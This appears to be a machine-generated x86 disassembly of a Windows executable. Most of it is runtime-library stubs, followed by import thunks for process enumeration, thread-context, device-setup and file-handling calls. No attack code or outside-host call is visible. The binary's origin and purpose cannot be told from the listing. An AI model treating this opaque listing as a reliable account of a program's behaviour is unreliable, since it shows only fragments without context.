push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200c67b
add esp 0x10
pop ebp
retn
sub_200c89f
push sub_200c85d
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_200cab7
retn
sub_200cdaa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_200d384
xor eax eax
inc eax
retn
sub_200d435
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
pop ebp
retn
pop ebp
jmp sub_200b6b7
sub_200d4c1
push 0x0
call sub_200d44f
pop ecx
retn
sub_200d53c
call [ TlsAlloc@IAT ]
retn 0x4
sub_200d545
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_200d55f
mov eax [ rw-data ]
retn
sub_200d599
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
pop ebp
retn 0x8
sub_200d6c8
push 0xd
call sub_2010d4a
pop ecx
retn
sub_200d6d1
push 0xc
call sub_2010d4a
pop ecx
retn
sub_200d887
push 0xd
call sub_2010d4a
pop ecx
retn
sub_200d893
push 0xc
call sub_2010d4a
pop ecx
retn
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
__imp_GetCurrentThread
jmp [ GetCurrentThread@IAT ]
sub_200daa3
xor eax eax
inc eax
retn
sub_200db4b
mov eax [ rw-data ]
retn
sub_200db99
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_200dbb0
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
jmp sub_200b53e
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_200b53e
sub_200e0c3
push 0xd
call sub_2010d4a
pop ecx
retn
sub_200e4cc
push 0xd
call sub_2010d4a
pop ecx
retn
sub_200e505
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_200e36b
pop ecx
mov [ rw-data ] 0x1
sub_200e523
mov eax [ rw-data ]
retn
sub_200e529
mov eax rw-data
retn
sub_200e86e
push 0xc
call sub_2010d4a
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_200e9e4
push 0xd
call sub_2010d4a
pop ecx
retn
sub_200e9f0
push 0xc
call sub_2010d4a
pop ecx
retn
sub_200e9f9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_200e937
sub_200ea9e
push 0xc
call sub_2010d4a
pop ecx
retn
sub_200eaaa
push 0xd
call sub_2010d4a
pop ecx
retn
j_sub_200ea04
jmp sub_200ea04
sub_200eab8
xor eax eax
retn
sub_200f651
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_200f55c
sub_200f78a
push 0xc
call sub_2010d4a
pop ecx
retn
sub_200f796
push 0xc
call sub_2010d4a
pop ecx
retn
sub_200f7c7
and [ esi + 0x70 ] 0xffffffef
retn
sub_200f7cc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
pop ebp
retn
sub_200f91a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_200fa78
push [ rw-data ]
call sub_200d4ca
pop ecx
retn
sub_200fa85
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_200f929
sub_200fab6
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200fa90
add esp 0x14
retn
sub_200fac6
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_200fa90
sub_200fdad
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_200fdbf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
sub_2010b11
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2010a89
add esp 0x14
pop ebp
retn
sub_2010d4a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_2010d61
push [ esp + 0x4 ]
push 0x0
call [ FatalAppExitA@IAT ]
push 0xff
call sub_200b73b
sub_2010e33
push 0xa
call sub_2010d4a
pop ecx
retn
sub_2010e6f
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax 0x3
neg eax
sbb eax eax
not eax
and eax [ rw-data ]
retn
xor eax eax
retn
sub_2011e8e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_2011ed3
push 0x0
call sub_2011e9d
pop ecx
retn
sub_2011edc
push [ rw-data ]
call sub_200d4ca
pop ecx
retn
sub_2011f30
xor eax eax
mov al [ esp + 0x8 ]
sub_2012248
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_2011fee
add esp 0x14
pop ebp
retn
sub_2012291
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_2011fee
add esp 0x14
pop ebp
retn
sub_2012570
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_20122ae
add esp 0x14
pop ebp
retn
sub_20125b9
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_20122ae
add esp 0x14
pop ebp
retn
sub_201268d
call sub_200bc44
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_2009d98
pop ecx
retn
call sub_20217c4
sub_2012b83
push 0x1
call sub_2010d4a
pop ecx
retn
sub_2012c62
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_2012b8c
add esp 0xc
pop ebp
retn 0x4
sub_2012c95
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_20223f1
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_2012cc8
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_2012b8c
add esp 0xc
pop ebp
retn 0x8
sub_20134bf
push [ ebp + 0x8 ]
call sub_2022631
pop ecx
retn
sub_2013dff
push [ ebp + 0x8 ]
call sub_2022631
pop ecx
retn
sub_2014175
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
add eax 0x8
sub_20145e0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x103
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_20145fa
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_2014610
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_2014627
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_201463a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x2
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_2014651
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_2014664
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x4
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_201467b
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_201468e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x80
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_20146a8
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_20146be
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x8
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_20146d5
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_20146e8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x10
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_20146ff
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_2014712
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x107
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_201472c
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_2014742
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x157
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_201475c
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_2014772
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x117
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_201478c
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_20147a2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x20
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
pop ebp
retn
sub_20147b9
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
pop ebp
retn
sub_20147cc
mov edi edi
push ebp
mov ebp esp
mov eax 0x80
cmp [ ebp + 0x8 ] ax
sbb eax eax
neg eax
pop ebp
retn
sub_2014ac9
push [ ebp + 0x8 ]
call sub_2022631
pop ecx
retn
sub_2014c4b
push [ ebp + 0x8 ]
call sub_2022631
pop ecx
retn
sub_2014e5c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
pop ebp
retn
sub_20161cb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0xbc ]
pop ebp
retn
sub_20185e6
push esi
call sub_2012720
pop ecx
retn
sub_20185ee
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_200fdd2
call sub_201855e
add esp 0x10
pop ebp
retn
sub_201860b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_202084f
call sub_201855e
add esp 0x10
pop ebp
retn
sub_2018628
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_2014e71
call sub_201855e
add esp 0x10
pop ebp
retn
sub_2018645
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_200fdd2
call sub_201855e
add esp 0x10
pop ebp
retn
sub_2018661
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_202084f
call sub_201855e
add esp 0x10
pop ebp
retn
sub_201867d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_2014e71
call sub_201855e
add esp 0x10
pop ebp
retn
sub_20187ba
call sub_200b75c
retn
sub_20187c0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_2018784
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_201891b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_201894d
push 0x8
push r--data
call sub_200db54
call sub_200d753
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_2023ab3
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_201896d
xor eax eax
inc eax
retn
sub_20189bd
xor eax eax
inc eax
retn
sub_20189c1
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_201894d
sub_20189d1
push sub_201894d
call sub_200d44f
pop ecx
mov [ rw-data ] eax
retn
sub_20189e2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_2018a7b
push edi
call sub_2010d4a
pop ecx
retn
sub_2018ad2
push [ rw-data ]
call sub_200d4ca
pop ecx
retn
sub_2018adf
call sub_200d753
add eax 0x64
retn
sub_2018ae8
call sub_200d753
add eax 0x60
retn
sub_2018ce9
push 0x0
call sub_2010d4a
pop ecx
retn
sub_2018ea2
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_2010d4a
pop ecx
sub_2018ede
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_2019174
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_2019183
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_20191b3
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_20191ca
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
push 0x8
call [ SetLastError@IAT ]
sub_20192c9
push [ ebp + 0x8 ]
call sub_2022631
pop ecx
retn
sub_20194a2
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20192d3
add esp 0x10
pop ebp
retn
sub_20194bc
mov edi edi
push ebp
mov ebp esp
call sub_201a085
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_20194cd
mov edi edi
push ebp
mov ebp esp
call sub_201a08b
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_20194de
mov edi edi
push ebp
mov ebp esp
call sub_201a091
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_201979b
push 0x7
call sub_2010d4a
pop ecx
retn
sub_2019c4a
push 0x6
call sub_2010d4a
pop ecx
retn
sub_2019c53
push 0x8
push r--data
call sub_200db54
push 0x6
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
call sub_20194ef
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2019c82
call sub_200db99
retn
sub_2019c82
push 0x6
call sub_2010d4a
pop ecx
retn
sub_2019cc3
push 0x6
call sub_2010d4a
pop ecx
retn
sub_201a085
mov eax rw-data
retn
sub_201a08b
mov eax rw-data
retn
sub_201a091
mov eax rw-data
retn
sub_201a097
mov eax rw-data
retn
sub_201a691
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_201a6a0
mov eax [ rw-data ]
retn
sub_201a6f9
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a712
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a72a
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a743
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a75b
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a774
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a78c
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a7a8
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a7c3
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a7df
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a7fa
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a816
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a831
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a84d
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a868
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a881
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a899
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a8b2
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a8ca
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a8e3
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_201a6a6
add esp 0x10
pop ebp
retn
sub_201a950
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_201a8fb
pop ecx
pop ecx
pop ebp
retn
sub_201a989
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
sub_201accb
mov eax [ rw-data ]
retn
sub_201acd1
call sub_200d753
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_200e804
sub_201bc5b
call sub_200d753
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_200e804
sub_201bc84
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_201bc5b
sub_201bca0
call sub_200d753
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_200e804
sub_201bcc6
call sub_200d753
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_200e804
sub_201bcec
call sub_200d753
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_200e804
sub_201be12
push 0x0
call sub_201bd12
pop ecx
retn
sub_201bf1b
push 0x0
call sub_201be1b
pop ecx
retn
sub_201c27b
push 0x0
call sub_201bf24
pop ecx
retn
sub_201cda1
call sub_200d753
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_200e804
sub_201ce78
or [ esi + 0x8 ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x1c ] eax
mov [ esi + 0x18 ] eax
retn
sub_201d602
test eax eax
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
sub_201d614
movzx eax [ eax ]
movzx ecx [ ecx ]
sub eax ecx
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
sub_2020300
and [ rw-data ] 0x0
retn
sub_202049c
push [ ebp + 0x8 ]
call sub_2022631
pop ecx
retn
sub_202141f
int3
sub_202185a
push 0x1
call sub_2010d4a
pop ecx
retn
sub_20222c0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2022156
add esp 0x10
pop ebp
retn
sub_20223c5
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_20222fc
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_2022410
call eax
retn
sub_2022628
push 0xa
call sub_2010d4a
pop ecx
retn
sub_202272b
push 0xa
call sub_2010d4a
pop ecx
retn
sub_20227e9
push 0xb
call sub_2010d4a
pop ecx
retn
sub_20229ee
push 0xc
push r--data
call sub_200db54
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
sub_2022a0b
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_2022aa0
call sub_2022a3e
mov [ rw-data ] eax
xor eax eax
retn
sub_2022c08
push 0x3
call sub_2010d4a
pop ecx
retn
sub_2022c4e
push 0x3
call sub_2010d4a
pop ecx
retn
sub_2022d6e
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2022c57
add esp 0x10
pop ebp
retn
sub_2023146
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_2022d90
sub_202325c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_20231e6
sub_20237ff
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x80
sbb eax eax
neg eax
pop ebp
retn
sub_2023811
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x7f
pop ebp
retn
sub_20239fd
push [ ebp + 0xc ]
call sub_2012720
pop ecx
retn
sub_2023aa1
push 0x4
call sub_2010d4a
pop ecx
retn
sub_2023aaa
push 0x2
call sub_200b6e7
pop ecx
retn
sub_2023beb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetLocaleInfoW@IAT ]
pop ebp
retn
sub_20240dc
push 0x7
call sub_2010d4a
pop ecx
retn
sub_20241b4
push 0x7
call sub_2010d4a
pop ecx
retn
sub_202429a
push 0x7
call sub_2010d4a
pop ecx
retn
sub_202439f
push 0x4
call sub_2010d4a
pop ecx
retn
sub_202456a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_202443c
pop ebp
retn
sub_2024969
push [ ebp + 0x8 ]
call sub_2022631
pop ecx
retn
sub_2024bbd
push [ ebp + 0x8 ]
call sub_2022631
pop ecx
retn
sub_2024bc7
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0xc0000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_2024be6
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_2024d9b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2024cad
add esp 0x10
pop ebp
retn
sub_20257a4
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20256e8
add esp 0xc
pop ebp
retn
timeGetTime
jmp [ timeGetTime@IAT ]
SetupDiGetClassDevsA
jmp [ SetupDiGetClassDevsA@IAT ]
SetupDiDestroyDeviceInfoList
jmp [ SetupDiDestroyDeviceInfoList@IAT ]
SetupDiGetDeviceRegistryPropertyA
jmp [ SetupDiGetDeviceRegistryPropertyA@IAT ]
SetupDiGetDeviceInterfaceDetailA
jmp [ SetupDiGetDeviceInterfaceDetailA@IAT ]
SetupDiEnumDeviceInterfaces
jmp [ SetupDiEnumDeviceInterfaces@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
FindCloseChangeNotification
jmp [ FindCloseChangeNotification@IAT ]
SetFileTime
jmp [ SetFileTime@IAT ]
GetWindowsDirectoryA
jmp [ GetWindowsDirectoryA@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
FileTimeToSystemTime
jmp [ FileTimeToSystemTime@IAT ]
FlushFileBuffers
jmp [ FlushFileBuffers@IAT ]
CreateDirectoryA
jmp [ CreateDirectoryA@IAT ]
RemoveDirectoryA
jmp [ RemoveDirectoryA@IAT ]
MoveFileA
jmp [ MoveFileA@IAT ]
FindFirstChangeNotificationA
jmp [ FindFirstChangeNotificationA@IAT ]
GetCurrentDirectoryA
jmp [ GetCurrentDirectoryA@IAT ]
GetFileTime
jmp [ GetFileTime@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
GetThreadContext
jmp [ GetThreadContext@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
OpenProcess
jmp [ OpenProcess@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
